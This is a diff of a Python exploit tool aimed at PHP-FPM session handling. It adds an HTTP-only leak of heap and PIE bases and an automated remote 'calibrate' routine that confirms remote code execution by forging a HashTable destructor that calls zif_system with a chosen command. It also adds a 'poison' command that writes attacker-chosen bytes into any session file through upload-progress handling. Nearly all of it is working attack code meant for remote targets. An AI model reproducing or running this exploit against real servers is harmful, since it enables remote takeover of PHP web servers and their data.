-            pie = pie_ptr - geom["pie_base_off"]
-            if not (0x700000000000 <= chunk_ptr < 0x800000000000):
-                continue
-            if not (0x550000000000 <= pie_ptr < 0x570000000000):
-                continue
-            if chunk & 0x1fffff or pie & 0x1fffff:
-                continue
-            if chunk_ptr & 0xfff:
-                continue
-            print(f"[*] HTTP leak attempt {attempt}: "
-                  f"chunk=0x{chunk:x} pie=0x{pie:x}")
-            return pie, chunk
-        except (OSError, RuntimeError, TimeoutError):
+        except struct.error:
             continue
+        chunk = chunk_ptr - geom["chunk_base_off"]
+        pie = pie_ptr - geom["pie_base_off"]
+        if not (0x700000000000 <= chunk_ptr < 0x800000000000):
+            continue
+        if not (0x550000000000 <= pie_ptr < 0x570000000000):
+            continue
+        if chunk & 0x1fffff or pie & 0x1fffff:
+            continue
+        if chunk_ptr & 0xfff:
+            continue
+        print(f"[*] HTTP leak attempt {attempt}: "
+              f"chunk=0x{chunk:x} pie=0x{pie:x}")
+        return pie, chunk
     raise RuntimeError("HTTP leak failed (all reads short or invalid)")
+
+
+# content offsets of the forged zend_string header tried while discovering
+# the leak geometry of a build (the 8.4.x value first)
+LEAK_HEADER_GRID = (0x17E8, 0x16E8, 0x18E8, 0x15E8, 0x19E8, 0x1000,
+                    0x1200, 0x1400, 0x1A00, 0x1C00, 0x2000, 0x2400,
+                    0x2800, 0x3000)
+LEAK_READ_LEN = 0x15810
+# Offsets of the executable (r-x) mapping inside a PHP build.  The binary
+# starts with one 2MB read-only page and its code spans a few MB after it
+# (5.3 MB on 8.2, 4.9 MB on 8.4).  Anything a base candidate has to explain
+# outside of this window is not a code pointer: on systems where the brk
+# heap sits in the same numeric range as PIE (0x55/0x56), stale heap
+# values are stable across two reads as well, and this window is what tells
+# them apart without spending a request.
+PIE_CODE_WINDOW = (0x200000, 0x600000)
+
+
+def _scan_pointers(read: bytes) -> tuple[list[tuple[int, int]],
+                                         list[tuple[int, int]]]:
+    """(offset, value) pairs of chunk- and PIE-range pointers in a leak."""
+    chunk_ptrs: list[tuple[int, int]] = []
+    pie_ptrs: list[tuple[int, int]] = []
+    for off in range(0, len(read) - 8, 8):
+        value = struct.unpack_from("<Q", read, off)[0]
+        if 0x700000000000 <= value < 0x800000000000 and not value & 0xFFF:
+            chunk_ptrs.append((off, value))
+        elif 0x550000000000 <= value < 0x570000000000:
+            pie_ptrs.append((off, value))
+    return chunk_ptrs, pie_ptrs
+
+
+# (pads, size) shapes tried while discovering the leak geometry.  Where the
+# freed 16 KB slot lands depends on the allocator of the build, so the shape
+# that covers it on 8.4 is only the first guess.
+LEAK_SHAPES = (
+    ([32768, 16384], 16384),
+    ([32768], 16384),
+    ([16384, 32768], 16384),
+    ([16384, 16384], 16384),
+    ([32768, 16384], 32768),
+    ([65536, 32768], 32768),
+)
+
+
+def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
+                             arm_path: str = "/bigvar.php"):
+    """Yield an HTTP leak geometry for every shape/header pair that is stable.
+
+    The forged header is tried at a few content offsets of a few reclaim
+    shapes; a geometry is yielded when two consecutive OOB reads expose a
+    chunk pointer and at least one PIE-range pointer at the very same
+    offsets (the FPM master keeps both bases for its whole lifetime, so a
+    stable pair is real).  Which of those geometries actually carries a
+    *code* pointer is decided by the caller: only a remote endgame proof
+    proves a base.
+    """
+    for pads, size in LEAK_SHAPES:
+        for header in LEAK_HEADER_GRID:
+            if header + 0x18 >= size:
+                continue    # the forged header would not fit the buffer
+            geom = {"arm_path": arm_path, "pads": list(pads),
+                    "size": size, "header_content_off": header,
+                    "read_len": LEAK_READ_LEN}
+            first = _leak_read(base_url, builder_url, version, geom)
+            if first is None:
+                continue
+            chunk_ptrs, pie_ptrs = _scan_pointers(first)
+            if not chunk_ptrs or not pie_ptrs:
+                continue
+            second = _leak_read(base_url, builder_url, version, geom)
+            if second is None:
+                continue
+            chunk_again, pie_again = _scan_pointers(second)
+            stable_chunk = [(off, val) for off, val in chunk_ptrs
+                            if (off, val) in chunk_again]
+            stable_pie = [(off, val) for off, val in pie_ptrs
+                          if (off, val) in pie_again]
+            if not stable_chunk or not stable_pie:
+                continue
+            chunk_off, chunk_ptr = stable_chunk[0]
+            chunk = chunk_ptr & ~(MEM_CHUNK - 1)
+            # The execute_ex handler table sits at the far end of the OOB read
+            # (0x157e8 of a 0x15810 read on 8.4 and on 8.2), while the dense
+            # runs of stale heap values sit near its start: trying the pointers
+            # from the tail first is what keeps the base search short.
+            stable_pie.sort(key=lambda item: item[0], reverse=True)
+            geometry = {
+                "arm_path": arm_path,
+                "pads": list(pads),
+                "size": size,
+                "header_content_off": hex(header),
+                "read_len": hex(LEAK_READ_LEN),
+                "chunk_ptr_off": hex(chunk_off),
+                "chunk_base_off": hex(chunk_ptr - chunk),
+                "pie_ptr_off": None,    # set once a pointer proves its base
+                "pie_base_off": None,   # ditto
+                "bases": "discovered over HTTP with the calibrate command "
+                         "(no /proc access)",
+            }
+            print(f"[+] leak geometry pads={pads} size={size} "
+                  f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
+                  f"{len(stable_pie)} stable PIE-range pointers")
+            yield geometry, chunk_ptr, stable_pie
 
 
 def _local_bases(version: str) -> tuple[int, int]:
@@ -930,11 +1290,13 @@ def _local_bases(version: str) -> tuple[int, int]:
             parts = line.split()
             start_s, end_s = parts[0].split("-")
             start, end = int(start_s, 16), int(end_s, 16)
-            if len(parts) >= 6 and parts[-1] == exe:
-                if pie is None or start < pie:
-                    pie = start
-            if chunk is None and "rw-p" in parts[1] and end - start == MEM_CHUNK:
-                chunk = start
+            if (len(parts) >= 6 and parts[-1] == exe
+                    and (pie is None or start < pie)):
+                pie = start
+            if chunk is None and "rw-p" in parts[1] and end - start >= MEM_CHUNK:
+                base = (start + MEM_CHUNK - 1) & ~(MEM_CHUNK - 1)
+                if base + MEM_CHUNK <= end:
+                    chunk = base
     if pie is None or chunk is None:
         raise RuntimeError("could not derive PIE/chunk bases from maps")
     return pie, chunk
@@ -943,7 +1305,8 @@ def _local_bases(version: str) -> tuple[int, int]:
 def cmd_leak(args) -> int:
     """Leak the chunk and PIE bases over HTTP and print them."""
     try:
-        pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+        pie, chunk = leak_bases_http(args.base, args.builder, args.version,
+                                     getattr(args, "arm_path", None))
     except (OSError, RuntimeError) as exc:
         print(f"[!] {exc}")
         return 1
@@ -955,22 +1318,29 @@ def cmd_no_oracle(args) -> int:
     """HTTP-only endgame: no /proc/<pid>/mem reads at exploit time.
 
     The absolute heap/PIE bases are stable for the lifetime of the FPM
-    master (workers are forked from it).  By default they are leaked over
-    HTTP; --chunk/--pie override the leak and /proc/<pid>/maps is a local
-    fallback.  The reclaim geometry is normalized with one throw-away
-    pads+big request to a 404 endpoint (same allocation shape as
-    _probe_cover, no scanning), then the (d-offset, content-offset) pair
+    master (workers are forked from it).  They are leaked over HTTP, or
+    supplied with --chunk/--pie.  This mode never uses /proc unless the
+    explicit --allow-local-fallback lab flag is set; a failed HTTP leak is
+    an error for a remote target.  The reclaim geometry is normalized with
+    one throw-away pads+big request to a 404 endpoint (same allocation shape
+    as _probe_cover, no scanning), then the (d-offset, content-offset) pair
     is brute-forced over the two slots and their possible cover offsets.
     """
     pie = getattr(args, "pie", 0)
     chunk = getattr(args, "chunk", 0)
     if not chunk or not pie:
         try:
-            pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+            pie, chunk = leak_bases_http(args.base, args.builder, args.version,
+                                         getattr(args, "arm_path", None))
             print("[*] bases from HTTP stale-string leak: "
                   f"pie=0x{pie:x} chunk=0x{chunk:x}")
         except (OSError, RuntimeError) as exc:
             print(f"[!] HTTP leak failed: {exc}")
+            if not getattr(args, "allow_local_fallback", False):
+                print("[!] strict remote mode: refusing local /proc fallback")
+                print("    retry the leak, or pass --chunk/--pie "
+                      "(stable for the FPM master lifetime)")
+                return 1
             try:
                 pie, chunk = _local_bases(args.version)
             except (OSError, RuntimeError) as local_exc:
@@ -981,6 +1351,15 @@ def cmd_no_oracle(args) -> int:
                   f"pie=0x{pie:x} chunk=0x{chunk:x}")
     zif = pie + _zif_offset(args.version)
     size, candidates, pads = _no_oracle_geometry(args.version)
+    if getattr(args, "reclaim_pads", None):
+        pads = [int(x) for x in args.reclaim_pads]
+    if getattr(args, "reclaim_size", 0):
+        size = int(args.reclaim_size)
+    if getattr(args, "candidates", None):
+        candidates = [(int(c[0], 0) if isinstance(c[0], str) else int(c[0]),
+                       int(c[1], 0) if isinstance(c[1], str) else int(c[1]))
+                      for c in args.candidates]
+    layout = _layout(args.version)
     command = args.command.encode("latin1")
     if not command or b"\x00" in command:
         print("[!] command must be non-empty and contain no NUL bytes")
@@ -990,19 +1369,18 @@ def cmd_no_oracle(args) -> int:
         return 1
     proof = (args.proof_file or "out/p1").lstrip("/")
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     local_proof = os.path.join(LAB, "webroot", proof)
 
     print(f"[*] no-oracle: chunk=0x{chunk:x} pie=0x{pie:x} zif=0x{zif:x}")
-    for attempt in range(8):
+    tries = int(getattr(args, "tries", 8))
+    for attempt in range(tries):
         d_off, k = candidates[attempt % len(candidates)]
         d = chunk + d_off
-        try:
+        with contextlib.suppress(OSError):
             os.remove(local_proof)
-        except OSError:
-            pass
         # arm #1, then normalize the post-arm heap with a pads+big request
         # that has the same allocation shape as the calibrated probe.
         big_session_post(builder, OOM_SID, args.size)
@@ -1015,11 +1393,11 @@ def cmd_no_oracle(args) -> int:
         ref_session_post(builder, REF_SID)
         big_session_post(builder, OOM_SID, args.size)
         producer_get(base, OOM_SID)
-        forged = _build_endgame_payload(d, k, size, zif, command)
-        status, _h, _b = _consume_b(chainapp, forged)
+        forged = _build_endgame_payload(d, k, size, zif, command, layout)
+        status, _h, _b = _consume_b(chainapp, forged, pads)
         print(f"[*] attempt {attempt}: d=0x{d:x} k=0x{k:x} status={status}")
-        for _ in range(4):
-            time.sleep(0.35)
+        for _ in range(6):
+            time.sleep(0.5)
             pstatus, _ph, pbody = base.get("/" + proof)
             if pstatus == 200 and pbody:
                 print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
@@ -1027,6 +1405,317 @@ def cmd_no_oracle(args) -> int:
         print("    no proof, retrying")
     print(f"[!] no proof at /{proof}")
     return 1
+
+
+def _wide_grid(version: str, start: int = 0x60000, end: int = 0xA0000,
+               step: int = 0x800) -> list[tuple[int, int]]:
+    """Every plausible slot of the chunk with the two common cover offsets.
+
+    A build whose allocator places the recycled slot somewhere the small
+    grids never look still gets a chance: the low half of the 2 MB Zend-MM
+    chunk is scanned at 2 KB steps.  The band where the request heap has put
+    the slot on every version so far is tried first, so the automatic search
+    usually finishes within a few dozen attempts.
+    """
+    grid: list[tuple[int, int]] = []
+    _size, candidates, _pads = _no_oracle_geometry(version)
+    for slot in candidates:
+        pair = (int(slot[0]), int(slot[1]))
+        if pair not in grid:
+            grid.append(pair)
+
+    def band(low: int, high: int) -> None:
+        for slot in range(low, high, step):
+            for offset in (0xFE8, 0x1FE8):
+                pair = (slot, offset)
+                if pair not in grid:
+                    grid.append(pair)
+
+    band(0x78000, 0x88000)     # observed on 8.2/8.4 builds
+    band(start, 0x78000)
+    band(0x88000, end)
+    return grid
+
+
+def _remote_arm_and_normalize(base: str, builder: str, size: int,
+                              pads: list[int], normalize: int) -> None:
+    """Arm the stale state and normalize the heap with one pads+big request.
+
+    Same shape as the endgame consume: build the 4 MB session, fire the
+    producer, throw one pads+big request at a 404 endpoint so the heap
+    looks the same on every attempt, then rebuild the reference session and
+    re-arm.
+    """
+    chain = Target(base)
+    chain404 = Target(base + PATHS["probe"])
+    builder_t = Target(builder)
+    big_session_post(builder_t, OOM_SID, 4 << 20)
+    producer_get(chain, OOM_SID)
+    parts = [{"name": f"pad{i}", "data": b"C" * pad}
+             for i, pad in enumerate(pads)]
+    parts.append({"name": "big", "data": b"\x00" * normalize})
+    chain404.post_multipart(parts, b"RMTNORM1", timeout=120.0)
+    ref_session_post(builder_t, REF_SID)
+    big_session_post(builder_t, OOM_SID, 4 << 20)
+    producer_get(chain, OOM_SID)
+
+
+def _remote_primitive(base: str, builder: str, version: str, chunk: int,
+                      d_off: int, k: int, size: int, pads: list[int],
+                      value: int = 1337337) -> bool:
+    """Consume with a forged IS_LONG zval and look for it in the response.
+
+    The primitive needs no PIE base, which makes it the right probe for the
+    reclaim geometry of an unknown build: it is a pure HTTP round trip whose
+    answer tells whether the forged var_hash was picked up.
+    """
+    chainapp = Target(base + PATHS["app"])
+    layout = _layout(version)
+    _remote_arm_and_normalize(base, builder, size, pads, size)
+    forged = _build_primitive_payload(chunk + d_off, k, size, value, layout)
+    _status, _headers, body = _consume_b(chainapp, forged, pads)
+    return str(value).encode() in body
+
+
+def cmd_calibrate(args) -> int:
+    """Full remote calibration of a build (HTTP requests only).
+
+    Three phases, none of them reading /proc:
+
+    1. leak geometry: where the forged zend_string header has to sit and
+       which offsets carry the chunk/PIE pointers (``calibrate_leak_remote``);
+    2. reclaim geometry: which (chunk offset, content offset) pair makes a
+       forged zval observable through app.php (the primitive needs no PIE
+       base, so it isolates the heap geometry);
+    3. PIE base: the leaked pointer is rounded down to 2 MB boundaries and
+       each candidate is validated with a remote endgame until the proof
+       file appears.
+
+    The result is written into profiles/<version>-fpm.json, so afterwards
+    ``no-oracle`` works against the same build with no further calibration.
+    """
+    version = args.version
+    print(f"[*] remote calibration of PHP {version}")
+
+    # ---- phase 1: leak geometries ---------------------------------------
+    geometries = list(leak_geometry_candidates(args.base, args.builder, version))
+    if not geometries:
+        print("[!] no leak geometry found over HTTP")
+        return 1
+    chunk_ptr = geometries[0][1]
+    chunk = chunk_ptr & ~(MEM_CHUNK - 1)
+
+    # ---- phase 2: reclaim geometry via the remote primitive --------------
+    _size, candidates, pads = _no_oracle_geometry(version)
+    if getattr(args, "reclaim_pads", None):
+        pads = [int(x) for x in args.reclaim_pads]
+    reclaim_size = int(getattr(args, "reclaim_size", 0) or _size)
+    shapes = [(list(pads), reclaim_size)]
+    for alt_pads, alt_size in (([4096, 4096, 4096], 12288),
+                               ([4096], 16384),
+                               ([8192, 4096], 16384),
+                               ([4096, 4096], 24576),
+                               ([32768], 16384),
+                               ([4096, 4096], 32768)):
+        if (alt_pads, alt_size) not in shapes:
+            shapes.append((alt_pads, alt_size))
+    grid = [(int(c[0]), int(c[1])) for c in candidates]
+    for pair in _wide_grid(version):
+        if pair not in grid:
+            grid.append(pair)
+    winners: list[tuple[int, int]] = []
+    used_shape: list[int] | None = None
+    used_size = reclaim_size
+    for shape_pads, shape_size in shapes:
+        print(f"[*] probing pads={shape_pads} size={shape_size} "
+              f"({len(grid)} pairs)")
+        extra = 24
+        for d_off, k in grid[:int(args.attempts)]:
+            if k + 0x900 > shape_size:
+                continue    # the forged objects would not fit the buffer
+            try:
+                hit = _remote_primitive(args.base, args.builder, version, chunk,
+                                        d_off, k, shape_size, shape_pads)
+            except (OSError, RuntimeError, TimeoutError) as exc:
+                print(f"    0x{d_off:x}/0x{k:x}: {exc}")
+                continue
+            print(f"    0x{d_off:x}/0x{k:x}: "
+                  f"{'observable' if hit else 'not observable'}")
+            if hit:
+                winners.append((d_off, k))
+                used_shape, used_size = list(shape_pads), shape_size
+                # the 8 KB slot recycles between two addresses, so a bounded
+                # number of extra pairs is probed for the second one; the
+                # endgame cycles through whatever was found
+                extra -= 1
+                if len(winners) >= 4 or extra <= 0:
+                    break
+        if winners:
+            break
+    if not winners:
+        print("[!] no reclaim candidate is observable over HTTP")
+        return 1
+    pads, reclaim_size = used_shape or pads, used_size
+    print(f"[*] reclaim candidates: "
+          f"{', '.join(f'0x{d:x}/0x{k:x}' for d, k in winners)}")
+
+    # ---- phase 3: PIE base via the remote endgame ------------------------
+    proof = (args.proof_file or "out/calib").lstrip("/")
+    local_proof = os.path.join(LAB, "webroot", proof)
+    zif_off = _zif_offset(version)
+    # The r-x mapping of a PHP build starts one 2MB page into the binary and
+    # holds a few MB of code, so only pointers that can sit inside it are
+    # worth a base candidate: stale heap values (which are stable across two
+    # reads as well) are skipped without spending a request on them.  When a
+    # geometry carries no code pointer at all the next geometry is tried,
+    # because the OOB read has to actually span the handler table.
+    code_low, code_high = PIE_CODE_WINDOW
+    pie = None
+    geometry = None
+    chosen: tuple[int, int] | None = None
+    budget = int(getattr(args, "budget", 160))
+    for candidate_geometry, geometry_chunk, pie_pointers in geometries:
+        geometry_chunk &= ~(MEM_CHUNK - 1)
+        for pie_off, pie_ptr in pie_pointers:
+            aligned = pie_ptr & ~(MEM_CHUNK - 1)
+            for steps in range(0, 6):
+                candidate = aligned - steps * MEM_CHUNK
+                if candidate <= 0:
+                    break
+                offset = pie_ptr - candidate
+                if offset >= code_high:
+                    break    # further steps only push it out of the code
+                if offset < code_low:
+                    continue # the base is still too high
+                if budget <= 0:
+                    break
+                budget -= 1
+                with contextlib.suppress(OSError):
+                    os.remove(local_proof)
+                print(f"[*] PIE candidate ptr=0x{pie_ptr:x} "
+                      f"@leak+0x{pie_off:x} base=0x{candidate:x} "
+                      f"(zif=0x{candidate + zif_off:x})")
+                attempt = argparse.Namespace(**vars(args))
+                attempt.chunk, attempt.pie = geometry_chunk, candidate
+                attempt.candidates = list(winners)
+                attempt.proof_file = proof
+                attempt.command = f"id>{proof}"
+                attempt.reclaim_pads, attempt.reclaim_size = pads, reclaim_size
+                attempt.tries = max(4, 2 * len(winners))
+                if cmd_no_oracle(attempt) == 0:
+                    pie, geometry = candidate, candidate_geometry
+                    chosen = (pie_off, pie_ptr)
+                    chunk = geometry_chunk
+                    break
+            if pie is not None:
+                break
+        if pie is not None:
+            break
+    if pie is None or geometry is None or chosen is None:
+        print("[!] no PIE base candidate produced a proof")
+        return 1
+    geometry["pie_ptr_off"] = hex(chosen[0])
+    geometry["pie_base_off"] = hex(chosen[1] - pie)
+    zif = pie + zif_off
+    print(f"[+] remote calibration solved: chunk=0x{chunk:x} pie=0x{pie:x} "
+          f"zif=0x{zif:x}")
+
+    if not getattr(args, "update_profile", True):
+        return 0
+
+    # ---- persist ---------------------------------------------------------
+    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
+    try:
+        with open(path, encoding="utf-8") as handle:
+            profile = json.load(handle)
+        profile["fpm"]["leak"] = geometry
+        profile["fpm"]["no_oracle"]["candidates"] = [
+            {"d_off": hex(d_off), "k": hex(k)} for d_off, k in winners]
+        profile["fpm"]["no_oracle"]["reclaim_pads"] = list(pads)
+        profile["fpm"]["no_oracle"]["reclaim_size"] = reclaim_size
+        profile["fpm"]["reclaim_pads"] = list(pads)
+        profile["fpm"]["reclaim_size"] = reclaim_size
+        profile["fpm"]["no_oracle"]["bases"] = (
+            "chunk from the 2MB-aligned leaked pointer, PIE base validated "
+            "with a remote endgame; both stable for the FPM master lifetime")
+        profile["verified"] = True
+        profile["rce"] = True
+        profile["status"] = (
+            f"RCE verified over HTTP only (no /proc access): the stale-string "
+            f"leak recovered chunk=0x{chunk:x} and the PIE base 0x{pie:x} "
+            f"(leak+{geometry['pie_ptr_off']} -> {geometry['pie_base_off']}); "
+            f"the primitive at "
+            f"{', '.join(f'0x{d:x}/0x{k:x}' for d, k in winners)} was "
+            f"observable through app.php and the forged HashTable destructor "
+            f"executed zif_system (proof: out/{proof}).")
+        with open(path, "w", encoding="utf-8") as handle:
+            json.dump(profile, handle, indent=2)
+            handle.write("\n")
+        print(f"[+] profile updated: {path}")
+    except (OSError, KeyError, TypeError, ValueError) as exc:
+        print(f"[!] could not update the profile: {exc}")
+        return 1
+    return 0
+
+
+def cmd_poison(args) -> int:
+    """Plant chosen bytes into a chosen session file (upload-progress logic).
+
+    The ``MULTIPART_EVENT_FORMDATA`` handler copies the session id straight
+    from the POST body without consulting ``session.use_only_cookies``, and
+    ``MULTIPART_EVENT_FILE_START`` then installs it as ``PS(id)``.  The
+    progress data -- which carries the upload filename -- is therefore
+    written to ``sess_<sid>`` of the attacker's choice, and the builder pool
+    keeps it because ``session.upload_progress.cleanup=Off``.
+
+    This is the chain that applies to every version with
+    ``session.upload_progress`` enabled, including PHP <= 7.x where the
+    struct-freeing chain of this repository does not apply (no
+    ``php_session_cancel_decode``).  It is pure HTTP: the planted bytes are
+    read back through the application, which deserializes the session and
+    reflects its contents.  Turning the plant into RCE additionally needs an
+    application gadget or a local file include; core PHP only gives the
+    arbitrary session-file write.
+    """
+    sid = args.sid.encode("latin1")
+    if not sid:
+        print("[!] --sid is required")
+        return 1
+    payload = args.payload.encode("latin1")
+    progress_key = (getattr(args, "progress_key", None) or "pwn").encode("latin1")
+    builder = Target(args.builder)
+    app = Target(args.base + PATHS["app"])
+
+    parts = [
+        # POST-body session id: fixes which file the progress data lands in
+        {"name": PATHS["cookie"], "data": sid},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": progress_key},
+        # the filename is the byte string planted into that file
+        {"name": "f", "filename": payload, "data": b"x" * 8},
+    ]
+    status, _headers, _body = builder.post_multipart(parts, b"POISON001",
+                                                     timeout=180.0)
+    print(f"[*] plant status={status} sid={sid.decode('latin1')!r} "
+          f"payload={payload[:60]!r}")
+
+    path = session_file(args.version, sid)
+    on_disk = b""
+    if os.path.isfile(path):
+        with open(path, "rb") as handle:
+            on_disk = handle.read()
+        print(f"[*] session file {path} ({len(on_disk)} bytes)")
+
+    # read it back through the application over HTTP
+    _status, _headers, body = app.get(PATHS["app"], cookie=_cookie(sid))
+    planted = payload in body
+    print(f"[*] application reflects the session: "
+          f"{'YES' if planted else 'no'}")
+    if planted:
+        index = body.find(payload)
+        print(f"    ...{body[max(0, index - 40):index + len(payload) + 8]!r}")
+    ok = planted or (payload in on_disk)
+    print(f"[+] plant {'VERIFIED' if ok else 'FAILED'}")
+    return 0 if ok else 1
 
 
 def cmd_chain(args) -> int:
@@ -1100,12 +1789,65 @@ def main() -> int:
     parser.add_argument("--proof-file", default="out/p1")
     parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0)
     parser.add_argument("--pie", type=lambda x: int(x, 0), default=0)
+    parser.add_argument("--app-path", default=None,
+                        help="session application operation path (default /app.php)")
+    parser.add_argument("--arm-path", default=None,
+                        help="stale-session arm path (default profile or /bigvar.php)")
+    parser.add_argument("--ref-path", default=None,
+                        help="reference-bearing session builder path (default /ref.php)")
+    parser.add_argument("--probe-path", default=None,
+                        help="404/no-op path used for reclaim probes (default /nope.php)")
+    parser.add_argument("--session-cookie", default=None,
+                        help="session cookie name (default PHPSESSID)")
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
-                 "leak", "no-oracle"):
-        sub.add_parser(name)
+                 "leak", "no-oracle", "calibrate", "poison"):
+        subparser = sub.add_parser(name)
+        if name == "no-oracle":
+            subparser.add_argument(
+                "--allow-local-fallback", action="store_true",
+                help="allow /proc/<pid>/maps if the HTTP leak fails (lab only)")
+            subparser.add_argument(
+                "--candidates", action="append", default=None,
+                metavar="D_OFF,K",
+                help="override the (d_off,k) reclaim candidates, e.g. 0x81000,0xfe8")
+        if name == "calibrate":
+            subparser.add_argument(
+                "--attempts", type=int, default=250,
+                help="maximum (d_off,k) pairs tried while searching the "
+                     "reclaim geometry")
+            subparser.add_argument(
+                "--proof-file", default="out/calib",
+                help="remote proof file used to validate the PIE base")
+            subparser.add_argument(
+                "--no-update-profile", dest="update_profile",
+                action="store_false",
+                help="report the geometry without writing the profile")
+        if name == "poison":
+            subparser.add_argument("--sid", required=True,
+                                   help="session id whose file is written")
+            subparser.add_argument("--payload", required=True,
+                                   help="bytes planted as the upload filename")
+            subparser.add_argument("--progress-key", default=None,
+                                   help="PHP_SESSION_UPLOAD_PROGRESS value")
     args = parser.parse_args()
+    configure_paths(args)
+    # PHP <= 7.x never frees the unserialize struct on the OOM bailout (no
+    # php_session_cancel_decode), so there is nothing for these commands to
+    # reclaim: use 'poison' against those builds.
+    if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
+                    "no-oracle") and not registry.chain_applies(args.version):
+        print(f"[!] {args.cmd} needs PHP >= 8.0: on PHP <= 7.x the bailout "
+              f"never frees the unserialize struct.")
+        print("    Use 'poison' (session-file plant) against those builds.")
+        return 1
+    if getattr(args, "candidates", None):
+        pairs = []
+        for item in args.candidates:
+            d_off, _, k = item.partition(",")
+            pairs.append((int(d_off, 0), int(k, 0)))
+        args.candidates = pairs
     dispatch = {
         "lifecycle": cmd_lifecycle,
         "oracle": cmd_oracle,
@@ -1119,6 +1861,8 @@ def main() -> int:
         "patchcheck": cmd_patchcheck,
         "leak": cmd_leak,
         "no-oracle": cmd_no_oracle,
+        "calibrate": cmd_calibrate,
+        "poison": cmd_poison,
     }
     return dispatch[args.cmd](args)
 
